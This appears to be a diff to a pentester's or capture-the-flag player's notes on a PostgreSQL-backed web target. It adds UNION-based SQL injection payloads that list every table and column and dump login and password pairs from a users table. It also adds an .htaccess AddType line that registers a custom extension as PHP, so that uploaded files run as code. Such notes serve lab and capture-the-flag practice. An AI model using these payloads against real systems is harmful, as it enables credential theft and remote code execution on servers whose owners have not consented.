@@ -12,4 +12,10 @@ version(), current\_user, current\_database()
 
 concat in PG with ||
 
-`UNION SELECT null,table_name||':'||column_name,null,null FROM information_schema.columns`
+`UNION SELECT null,table_name||':'||column_name,null,null FROM information_schema.columns ORDER BY 2`
+
+`UNION SELECT null,login||':'||password,null,null FROM users`
+
+We can upload non-php-extension files but we can't run them unless we register a new type in .htaccess (because AllowOverride is set to all)
+
+`AddType application/x-httpd-php .doot`
